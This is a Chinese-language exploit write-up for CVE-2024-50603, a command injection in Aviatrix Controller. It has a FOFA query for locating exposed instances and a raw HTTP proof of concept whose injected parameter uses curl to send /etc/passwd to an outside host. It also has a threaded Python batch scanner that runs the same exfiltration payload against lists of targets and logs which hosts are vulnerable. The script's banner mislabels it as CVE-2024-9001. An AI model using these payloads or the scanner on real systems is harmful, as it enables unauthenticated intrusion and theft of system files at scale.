# 漏洞描述
<font style="color:rgb(52, 58, 64);">在Aviatrix Controller的7.1.4191版本之前以及7.2.x在7.2.4996版本之前存在一个漏洞。由于未正确处理操作系统命令中的特殊元素，未经身份验证的攻击者可以执行任意代码。云类型中的/v1/api用于发送shell元字符到list_flightpath_destination_instances或src_cloud_type的flightpath_connection_test。</font>

# <font style="color:rgb(52, 58, 64);">参考链接</font>
[https://www.securing.pl/en/cve-2024-50603-aviatrix-network-controller-command-injection-vulnerability/](https://www.securing.pl/en/cve-2024-50603-aviatrix-network-controller-command-injection-vulnerability/)

# fofa
title="Aviatrix Controller"

# 披露时间
<font style="color:rgb(33, 37, 41);">2025-01-08</font>

# <font style="color:rgb(33, 37, 41);">漏洞复现</font>

poc

```http
POST /v1/api HTTP/1.1
Host: 
Content-Length: 177
Content-Type: application/x-www-form-urlencoded
 
action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+-X+POST+-d+"@/etc/passwd"+http://dns.com)
```

![](https://cdn.nlark.com/yuque/0/2025/png/46595937/1736393692721-f985b6aa-7926-4380-ad56-1aae4b671c44.png)

![](https://cdn.nlark.com/yuque/0/2025/png/46595937/1736393711986-d8c6069c-91d9-48f5-b21b-8d8b879fc581.png)

# py脚本
```python
#coding:utf-8
import argparse
import requests
import re
import time
import random
import base64
import json
import concurrent.futures
import sys
import urllib


# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()

timeout = 10  # 请求超时时间

def verify(url, proxies={}):
    if not url.startswith(('http://', 'https://')):
        # 如果没有，就添加 'http://'
        url = 'http://' + url
    try:
        num = str(random.randint(1000, 9999))
        dns = f'https://eyes.sh/api/dns/xhs99/{num}/?token=8398ce3f'
        path = "/v1/api"
        vul_url = url + path
        header = {
            'Content-Length': '177',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = '''action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+-X+POST+-d+"@/etc/passwd"+http://'''+ num +'''.xhs99.eyes.sh)'''
        res = requests.post(vul_url, data=data, headers=header, verify=False, timeout=timeout, proxies=proxies, allow_redirects=False)
        a = requests.get(dns, verify=False, timeout=timeout, proxies=proxies, allow_redirects=False)
        if res.status_code == 200:
            if "True" in a.text:
                print('\033[1;31m' + '[+] Success ' + url + '\033[0m')
                with open('CVE-2024-50603.txt', 'a') as f:
                    f.write(url + '\n')
        else:
            print("[-] No vulnerabilities found")
        # if response.status_code == 200:
        #     print('[+] Verified')
        # else:
        #     print('[-] Verification Failed')
    except requests.exceptions.RequestException as e:
        print(e)

def pl(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
        return urls
    except Exception as e:
        print(f"[-] Error reading file {filename}: {e}")
        return []

def help():
    # helpinfo = """ """
    # print(helpinfo)
    print("CVE-2024-9001".center(100, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -p --proxies 代理设置")
    print(f"[+]{sys.argv[0]} -t --thread 线程设置，默认为10")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("--@ztomato".rjust(100," "))

def main():
    parser = argparse.ArgumentParser(description='@ztomato')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为10')
    parser.add_argument('-p', '--proxies', type=str, help='代理设置，如 http://127.0.0.1:8080')
    args = parser.parse_args()

    proxies = {}
    if args.proxies:
        proxies = {'http': args.proxies, 'https': args.proxies}

    if args.url:
        verify(args.url, proxies)
    elif args.file:
        urls = pl(args.file)
        if not urls:
            print(f"[-] No valid URLs found in {args.file}")
            return

        thread = 10
        if args.thread:
            thread = args.thread
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            # 使用 executor.map 实现并发调用
            results = list(executor.map(lambda url: verify(url, proxies), urls))
            # 可选：打印结果
            # for result in results:
            #     if result and result.get('isVul'):
            #         print(f"[+] Vulnerability confirmed for {result['url']}")
    else:
        help()

if __name__ == '__main__':
    main()
```

# 修复建议
<font style="color:rgb(52, 58, 64);">"将组件 Controller 升级至 7.2.4996 及以上版本"</font>

